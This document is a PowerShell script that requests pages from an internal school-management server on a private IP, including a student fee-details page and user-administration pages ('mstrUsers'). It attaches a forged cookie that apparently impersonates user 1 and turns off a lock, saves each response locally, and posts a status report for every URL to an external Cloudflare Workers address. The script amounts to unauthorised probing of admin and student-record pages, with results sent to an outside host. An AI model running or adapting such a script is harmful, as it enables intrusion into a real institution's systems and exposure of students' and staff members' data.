# --- Configuration ---
$BaseUrl = "http://192.168.29.20"
$WorkerUrl = "https://wispy-sunset-a7c0.anox.workers.dev/cskm"
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
$Cookie = "fy=2025; userno=1; lock=none; usernoT=; fyT=;"

$Paths = @(
    "/",
    "/pay-fees-details-v3.0.php?f=app&fy=2025&adm_no=19349",
    "/schoolexpert",
    "/schoolexpert/mstrUsers.php",
    "/schoolexpert/mstrUsers.asp"
)

# Headers setup
$Headers = @{
    "User-Agent" = $UserAgent
    "Cookie"     = $Cookie
}

Write-Host "Starting URL processing..."

foreach ($Path in $Paths) {
    $FullUrl = "$BaseUrl$Path"
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $SafeName = $Path -replace '[^a-zA-Z0-9]', '_'
    $TempFilePath = Join-Path $env:TEMP "resp_$($SafeName)_$($Timestamp).tmp"

    $Report = @{
        url         = $FullUrl
        path        = $Path
        timestamp   = (Get-Date).ToString("o")
        status_code = 0
        local_file  = $TempFilePath
        success     = $false
        content_len = 0
    }

    try {
        # Perform request
        $Response = Invoke-WebRequest -Uri $FullUrl -Headers $Headers -Method Get -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
        
        $Report.status_code = [int]$Response.StatusCode
        $Report.success = $true
        $Report.content_len = $Response.Content.Length
        
        # Save full response to local temp file
        $FileContent = @{
            url     = $FullUrl
            headers = $Response.Headers
            raw_body = $Response.Content
        } | ConvertTo-Json -Depth 10
        
        $FileContent | Set-Content -Path $TempFilePath
        Write-Host "Success: $FullUrl -> $TempFilePath"

    } catch {
        $Report.success = $false
        if ($_.Exception.Response) {
            $Report.status_code = [int]$_.Exception.Response.StatusCode
        }
        $Report.error = $_.Exception.Message
        
        # Save error details to local temp file
        $_.Exception.Message | Set-Content -Path $TempFilePath
        Write-Host "Failed: $FullUrl"
    }

    # Post results to Cloudflare Worker
    try {
        $JsonReport = $Report | ConvertTo-Json
        Invoke-RestMethod -Uri $WorkerUrl -Method Post -Body $JsonReport -ContentType "application/json"
    } catch {
        Write-Host "Worker logging failed for $FullUrl"
    }
}

Write-Host "Batch complete."
